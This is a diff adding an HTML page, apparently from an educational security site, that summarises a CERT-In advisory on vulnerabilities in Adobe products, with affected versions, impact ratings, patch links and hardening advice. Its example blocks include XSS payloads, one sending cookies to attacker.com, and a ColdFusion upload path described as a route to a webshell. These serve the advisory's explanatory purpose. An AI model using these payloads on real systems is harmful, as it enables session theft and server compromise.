@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CERT-In Advisory CIAD-2026-0031 | EthicalHack.dev</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-brand"><span class="brand-icon">&#x1F6E1;</span> EthicalHack<span class="brand-accent">.dev</span></a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-link">Home</a>
+      <a href="level2.html" class="nav-link">Level 2</a>
+      <a href="level3.html" class="nav-link">Level 3</a>
+      <a href="cbse-case.html" class="nav-link">CBSE Case</a>
+      <a href="cert-in.html" class="nav-link active">CERT-In</a>
+      <a href="disclose.html" class="nav-link">Disclose</a>
+    </div>
+    <button class="hamburger" id="hamburger">&#9776;</button>
+  </div>
+</nav>
+
+<div class="container">
+
+  <!-- ADVISORY HEADER CARD -->
+  <div style="background:linear-gradient(135deg,#1e1b4b 0%,#1a1035 100%);border:1px solid rgba(99,102,241,0.4);border-radius:var(--radius-lg);padding:28px;margin:32px 0 24px;display:flex;align-items:flex-start;gap:20px;flex-wrap:wrap">
+    <div style="background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.4);border-radius:var(--radius);padding:10px 16px;text-align:center;flex-shrink:0">
+      <div style="font-size:11px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:1px">CERT-In</div>
+      <div style="font-size:11px;color:#fca5a5;margin-top:2px">Official Advisory</div>
+    </div>
+    <div style="flex:1;min-width:200px">
+      <div style="font-size:11px;font-weight:700;color:#a78bfa;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Advisory ID</div>
+      <div style="font-size:28px;font-weight:800;color:#fff;margin-bottom:6px">CIAD-2026-0031</div>
+      <div style="font-size:16px;font-weight:600;color:#e0e7ff;margin-bottom:8px">Multiple Vulnerabilities in Adobe Products</div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <span style="font-size:12px;padding:3px 12px;border-radius:20px;background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.3);font-weight:600">Severity: HIGH</span>
+        <span style="font-size:12px;padding:3px 12px;border-radius:20px;background:rgba(255,255,255,0.08);color:#c7d2fe;border:1px solid rgba(255,255,255,0.15)">&#128197; June 11, 2026</span>
+        <span style="font-size:12px;padding:3px 12px;border-radius:20px;background:rgba(255,255,255,0.08);color:#c7d2fe;border:1px solid rgba(255,255,255,0.15)">&#127470;&#127475; MeitY / India</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUMMARY STATS -->
+  <div class="stats-grid" style="margin-bottom:32px">
+    <div class="stat-card"><div class="stat-val" style="color:var(--red)">11</div><div class="stat-label">Adobe products affected</div></div>
+    <div class="stat-card"><div class="stat-val" style="color:var(--orange)">4</div><div class="stat-label">Vulnerability classes</div></div>
+    <div class="stat-card"><div class="stat-val" style="color:var(--red)">RCE</div><div class="stat-label">Worst-case impact</div></div>
+    <div class="stat-card"><div class="stat-val" style="color:var(--green)">&#x2713; Patch</div><div class="stat-label">Fix available now</div></div>
+  </div>
+
+  <div class="info-box box-warn">
+    <span class="info-box-icon">&#9888;</span>
+    <span>This is a <strong>software vulnerability advisory</strong> — not a website flaw. These vulnerabilities exist inside Adobe desktop applications and servers. An attacker exploits them by getting a victim to open a specially crafted file (PDF, InDesign document, image).</span>
+  </div>
+
+  <!-- TABS -->
+  <div class="tab-bar" style="margin-top:24px">
+    <button class="tab-btn active" data-group="cert" data-tab="vulns">Vulnerability Types</button>
+    <button class="tab-btn" data-group="cert" data-tab="products">Affected Products</button>
+    <button class="tab-btn" data-group="cert" data-tab="impact">Impact</button>
+    <button class="tab-btn" data-group="cert" data-tab="patches">Patch Links</button>
+  </div>
+
+  <!-- VULN TYPES -->
+  <div class="tab-panel active" data-group="cert" data-tab="vulns">
+    <h2 style="font-size:20px;font-weight:700;margin-bottom:16px">Vulnerability Classes</h2>
+
+    <div class="detail-panel">
+      <div class="detail-panel-head">
+        <div>
+          <div class="detail-panel-title">&#128196; Improper Input Validation</div>
+          <div class="detail-panel-sub">CWE-20 &bull; Root cause for the majority of bugs in this advisory</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span class="sev-badge sev-critical">Critical</span>
+          <span class="detail-panel-chev">&#8964;</span>
+        </div>
+      </div>
+      <div class="detail-panel-body">
+        <p class="text-sm text-muted" style="margin-bottom:12px">Adobe products fail to properly validate data from user-supplied files. A specially crafted PDF, image, or form passes malformed bytes that the parser mishandles — leading to memory corruption or logic bypass, ultimately allowing arbitrary code execution.</p>
+        <div class="slabel">Attack scenario</div>
+        <div class="code-block"><span class="comment"># Attacker creates a malicious PDF with a crafted /AcroForm entry:</span>
+<span class="comment"># The value overflows the allocated buffer when Acrobat parses it</span>
+<span class="comment"># → control of EIP/RIP register → shellcode execution</span>
+
+<span class="comment"># Delivery methods:</span>
+<span class="comment"># 1. Phishing email: "Your CBSE result — open attached PDF"</span>
+<span class="comment"># 2. Malicious website with drive-by PDF download</span>
+<span class="comment"># 3. Shared design file (.indd) sent to a print studio</span></div>
+        <div class="two-col mt12">
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--orange)">Affected products</div><div class="mini-card-body">Acrobat &amp; Reader, InDesign, InCopy, Substance 3D Sampler, AEM Forms, Format Plugins</div></div>
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--green)">Fix</div><div class="mini-card-body">Update to latest patched version. Do not open files from untrusted sources until updated.</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="detail-panel">
+      <div class="detail-panel-head">
+        <div>
+          <div class="detail-panel-title">&#128187; Memory Corruption — Use-After-Free &amp; Heap Overflow</div>
+          <div class="detail-panel-sub">CWE-416, CWE-122 &bull; Acrobat, InDesign, InCopy, Substance 3D</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span class="sev-badge sev-critical">Critical</span>
+          <span class="detail-panel-chev">&#8964;</span>
+        </div>
+      </div>
+      <div class="detail-panel-body">
+        <p class="text-sm text-muted" style="margin-bottom:12px">Use-after-free: the application continues to use a pointer after the memory it points to has been freed. An attacker can place controlled data in that memory location and redirect execution. Heap overflow: writing past the end of a heap allocation corrupts adjacent metadata or function pointers.</p>
+        <div class="slabel">Why these are dangerous</div>
+        <div class="code-block"><span class="comment"># Use-After-Free example (conceptual — Acrobat JS API):</span>
+<span class="comment"># 1. PDF triggers allocation of object A</span>
+<span class="comment"># 2. PDF frees object A</span>
+<span class="comment"># 3. Attacker allocates object B at same address with controlled data</span>
+<span class="comment"># 4. Acrobat uses stale pointer to A → actually reads attacker's data</span>
+<span class="comment"># 5. Virtual function pointer in B points to shellcode → RCE</span>
+
+<span class="comment"># Modern exploit mitigations that make this harder (not impossible):</span>
+ASLR   <span class="comment">← randomizes base addresses</span>
+DEP    <span class="comment">← data regions non-executable  </span>
+CFG    <span class="comment">← control flow guard (Windows)</span>
+Sandbox <span class="comment">← Acrobat Protected Mode isolates reader process</span></div>
+      </div>
+    </div>
+
+    <div class="detail-panel">
+      <div class="detail-panel-head">
+        <div>
+          <div class="detail-panel-title">&#128269; Cross-Site Scripting (DOM-based &amp; Reflected XSS)</div>
+          <div class="detail-panel-sub">CWE-79 &bull; Adobe Experience Manager Cloud &amp; Content Credentials SDK</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span class="sev-badge sev-high">High</span>
+          <span class="detail-panel-chev">&#8964;</span>
+        </div>
+      </div>
+      <div class="detail-panel-body">
+        <p class="text-sm text-muted" style="margin-bottom:12px">AEM Cloud Service and the Content Credentials SDK (used for verifying content provenance on AI-generated media) contain XSS vulnerabilities. A low-privileged attacker can inject scripts that execute in the admin's browser — stealing tokens, pivoting to the backend, or injecting malicious content into the CMS.</p>
+        <div class="slabel">AEM XSS attack surface</div>
+        <div class="code-block"><span class="comment"># AEM search/query parameters often reflect user input:</span>
+https://aem-instance.company.com/content/search?q=<span class="bad">&lt;svg onload=alert(1)&gt;</span>
+
+<span class="comment"># Content Credentials SDK DOM XSS:</span>
+<span class="comment"># SDK reads URL fragment to display content metadata</span>
+https://viewer.contentcredentials.org/#<span class="bad">&lt;img src=x onerror=fetch('https://attacker.com?c='+document.cookie)&gt;</span>
+
+<span class="comment"># Impact in CMS context:</span>
+<span class="comment"># Admin opens crafted link → attacker gets admin session</span>
+<span class="comment"># → publishes malicious content to millions of site visitors</span></div>
+      </div>
+    </div>
+
+    <div class="detail-panel">
+      <div class="detail-panel-head">
+        <div>
+          <div class="detail-panel-title">&#128274; Security Bypass &amp; Privilege Escalation</div>
+          <div class="detail-panel-sub">CWE-284 &bull; Adobe ColdFusion &amp; Acrobat sandbox bypass</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span class="sev-badge sev-high">High</span>
+          <span class="detail-panel-chev">&#8964;</span>
+        </div>
+      </div>
+      <div class="detail-panel-body">
+        <p class="text-sm text-muted" style="margin-bottom:12px">ColdFusion flaws allow low-privileged users to bypass security restrictions and access admin functionality. Acrobat sandbox escapes let a compromised Reader process break out of its sandboxed environment and interact with the host OS.</p>
+        <div class="slabel">ColdFusion attack path</div>
+        <div class="code-block"><span class="comment"># ColdFusion admin panel exposed (common misconfiguration):</span>
+http://server:8500/CFIDE/administrator/
+
+<span class="comment"># Unpatched ColdFusion Update 8 → security bypass:</span>
+<span class="comment"># Guest user can access restricted admin endpoints</span>
+<span class="comment"># → upload .cfm webshell → full server RCE</span>
+POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/
+     connectors/cfm/upload.cfm
+
+<span class="comment"># Historical ColdFusion CVEs for reference:</span>
+CVE-2023-29300  <span class="comment">← Deserialization RCE</span>
+CVE-2023-26360  <span class="comment">← Improper access control</span>
+CVE-2024-20767  <span class="comment">← Auth bypass (patched in Update 9+)</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PRODUCTS -->
+  <div class="tab-panel" data-group="cert" data-tab="products">
+    <h2 style="font-size:20px;font-weight:700;margin-bottom:16px">All 11 Affected Adobe Products</h2>
+    <div class="product-grid">
+      <div class="product-card">
+        <div class="product-name">&#9729;&#65039; Adobe Experience Manager (AEM)</div>
+        <div class="product-ver">Cloud Service — prior to 2026.05 release<br>6.5 LTS SP1 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#128203; AEM Forms</div>
+        <div class="product-ver">AEM Forms AEM 6.5.24.0 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#127912; Adobe InDesign</div>
+        <div class="product-ver">ID21.3 and earlier<br>ID20.5.3 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#9999;&#65039; Adobe InCopy</div>
+        <div class="product-ver">AI21.3 and earlier versions</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#127760; Content Credentials SDK</div>
+        <div class="product-ver">@contentauth/c2pa-web@0.7.1 and earlier<br>c2pa-v0.80.1 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#128225; Adobe Dreamweaver</div>
+        <div class="product-ver">21.7 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#128196; Adobe Acrobat &amp; Reader</div>
+        <div class="product-ver">Classic 2024: 24.001.30365 and earlier<br>Acrobat: 26.001.21651 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#128421;&#65039; Adobe ColdFusion</div>
+        <div class="product-ver">Update 8 and earlier versions<br>Update 19 and earlier versions</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#127919; Substance 3D Sampler</div>
+        <div class="product-ver">20.5.3 and earlier</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#129307; Adobe Format Plugins</div>
+        <div class="product-ver">1.1.2 and earlier versions</div>
+      </div>
+      <div class="product-card">
+        <div class="product-name">&#128140; Adobe Campaign Classic</div>
+        <div class="product-ver">ACC v7: 7.4.3 build 9394 and earlier</div>
+      </div>
+    </div>
+    <div class="info-box box-info mt12">
+      <span class="info-box-icon">&#128161;</span>
+      <span>Check your installed version: in any Adobe app go to <strong>Help &rarr; About</strong> or <strong>Help &rarr; Check for Updates</strong>. Compare against the version numbers above — if you are on an older version, update immediately.</span>
+    </div>
+  </div>
+
+  <!-- IMPACT -->
+  <div class="tab-panel" data-group="cert" data-tab="impact">
+    <h2 style="font-size:20px;font-weight:700;margin-bottom:16px">Impact Assessment</h2>
+
+    <div class="two-col" style="margin-bottom:20px">
+      <div style="background:var(--bg2);border:1px solid var(--red-border);border-radius:var(--radius-lg);padding:18px">
+        <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:10px">&#128680; Worst-case scenarios</div>
+        <ul style="list-style:none;display:flex;flex-direction:column;gap:8px">
+          <li class="text-sm text-muted">&#x2022; Open one malicious PDF &rarr; attacker runs code with your OS privileges</li>
+          <li class="text-sm text-muted">&#x2022; ColdFusion server compromised &rarr; full web server takeover</li>
+          <li class="text-sm text-muted">&#x2022; AEM admin XSS &rarr; corporate website defaced / malware injected for visitors</li>
+          <li class="text-sm text-muted">&#x2022; Acrobat sandbox escape &rarr; malware persists after closing PDF</li>
+        </ul>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px">
+        <div style="font-size:13px;font-weight:700;color:var(--text2);margin-bottom:10px">&#127919; Who is most at risk</div>
+        <ul style="list-style:none;display:flex;flex-direction:column;gap:8px">
+          <li class="text-sm text-muted">&#x2022; IT admins running AEM Cloud or ColdFusion servers</li>
+          <li class="text-sm text-muted">&#x2022; Designers opening client InDesign / Substance 3D files</li>
+          <li class="text-sm text-muted">&#x2022; Anyone opening Acrobat PDFs from email attachments</li>
+          <li class="text-sm text-muted">&#x2022; Marketing teams using Adobe Campaign Classic</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="slabel">CVSS Impact Dimensions</div>
+    <div class="impact-row"><span class="impact-label" style="min-width:120px">Code Execution</span><div class="impact-track"><div class="impact-fill" style="width:100%;background:var(--red)"></div></div><span class="text-xs text-muted" style="min-width:30px;text-align:right">10.0</span></div>
+    <div class="impact-row"><span class="impact-label" style="min-width:120px">Priv Escalation</span><div class="impact-track"><div class="impact-fill" style="width:90%;background:var(--red)"></div></div><span class="text-xs text-muted" style="min-width:30px;text-align:right">9.0</span></div>
+    <div class="impact-row"><span class="impact-label" style="min-width:120px">Data Disclosure</span><div class="impact-track"><div class="impact-fill" style="width:80%;background:var(--orange)"></div></div><span class="text-xs text-muted" style="min-width:30px;text-align:right">8.0</span></div>
+    <div class="impact-row"><span class="impact-label" style="min-width:120px">XSS / Auth</span><div class="impact-track"><div class="impact-fill" style="width:75%;background:var(--orange)"></div></div><span class="text-xs text-muted" style="min-width:30px;text-align:right">7.5</span></div>
+    <div class="impact-row"><span class="impact-label" style="min-width:120px">DoS</span><div class="impact-track"><div class="impact-fill" style="width:65%;background:var(--accent)"></div></div><span class="text-xs text-muted" style="min-width:30px;text-align:right">6.5</span></div>
+  </div>
+
+  <!-- PATCHES -->
+  <div class="tab-panel" data-group="cert" data-tab="patches">
+    <h2 style="font-size:20px;font-weight:700;margin-bottom:8px">Official Patch Links</h2>
+    <p class="text-sm text-muted" style="margin-bottom:16px">Apply security updates from Adobe Security Bulletins. Prioritise AEM, ColdFusion, and Acrobat — highest exploitation probability.</p>
+
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Product</th>
+          <th>Bulletin ID</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>Adobe Experience Manager</td><td class="font-mono">apsb26-56</td><td><a href="https://helpx.adobe.com/security/products/experience-manager/apsb26-56.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>AEM Forms</td><td class="font-mono">apsb26-57</td><td><a href="https://helpx.adobe.com/security/products/aem-forms/apsb26-57.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe InDesign</td><td class="font-mono">apsb26-58</td><td><a href="https://helpx.adobe.com/security/products/indesign/apsb26-58.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe InCopy</td><td class="font-mono">apsb26-59</td><td><a href="https://helpx.adobe.com/security/products/incopy/apsb26-59.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Substance 3D Sampler</td><td class="font-mono">apsb26-60</td><td><a href="https://helpx.adobe.com/security/products/substance3d-sampler/apsb26-60.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Content Credentials SDK</td><td class="font-mono">apsb26-61</td><td><a href="https://helpx.adobe.com/security/products/content-authenticity-sdk/apsb26-61.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe Dreamweaver</td><td class="font-mono">apsb26-62</td><td><a href="https://helpx.adobe.com/security/products/dreamweaver/apsb26-62.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe Acrobat &amp; Reader</td><td class="font-mono">apsb26-63</td><td><a href="https://helpx.adobe.com/security/products/acrobat/apsb26-63.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe ColdFusion</td><td class="font-mono">apsb26-64</td><td><a href="https://helpx.adobe.com/security/products/coldfusion/apsb26-64.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Format Plugins</td><td class="font-mono">apsb26-65</td><td><a href="https://helpx.adobe.com/security/products/formatplugins/apsb26-65.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+        <tr><td>Adobe Campaign Classic</td><td class="font-mono">apsb26-66</td><td><a href="https://helpx.adobe.com/security/products/campaign/apsb26-66.html" target="_blank" rel="noopener" style="color:var(--accent2)">View patch &#8599;</a></td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box box-safe mt12">
+      <span class="info-box-icon">&#x2705;</span>
+      <div>
+        <strong>Hardening checklist beyond patching:</strong>
+        <ul style="margin-top:8px;padding-left:16px;display:flex;flex-direction:column;gap:4px">
+          <li class="text-sm">Enable Acrobat Protected Mode (Edit &rarr; Preferences &rarr; Security Enhanced)</li>
+          <li class="text-sm">Restrict ColdFusion admin panel to internal IPs — never expose port 8500 to internet</li>
+          <li class="text-sm">Deploy WAF rules blocking XSS patterns on AEM endpoints</li>
+          <li class="text-sm">Run Adobe apps as non-admin / non-root user accounts</li>
+          <li class="text-sm">Subscribe to <a href="https://www.adobe.com/subscription/priority-product-update.html" target="_blank" rel="noopener" style="color:var(--accent2)">Adobe Priority Product Update</a> for future advisories</li>
+        </ul>
+      </div>
+    </div>
+
+    <div style="margin-top:20px;padding:16px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg)">
+      <div class="slabel">CERT-In Contact</div>
+      <div class="code-block">Email:   incident@cert-in.org.in
+Phone:   +91-11-22902657
+Website: https://cert-in.org.in
+Address: Electronics Niketan, 6 CGO Complex,
+         Lodhi Road, New Delhi - 110 003, India</div>
+    </div>
+  </div>
+
+</div>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">&#x1F6E1; EthicalHack.dev</div>
+    <div class="footer-links">
+      <a href="cbse-case.html">CBSE Case Study</a>
+      <a href="disclose.html">Responsible Disclosure</a>
+      <a href="https://cert-in.org.in" target="_blank" rel="noopener">CERT-In Official &#8599;</a>
+    </div>
+    <div class="footer-note">Advisory source: CERT-In CIAD-2026-0031, June 11, 2026. Information provided on "as is" basis per CERT-In disclaimer.</div>
+  </div>
+</footer>
+
+<script src="assets/js/nav.js"></script>
+</body>
+</html>
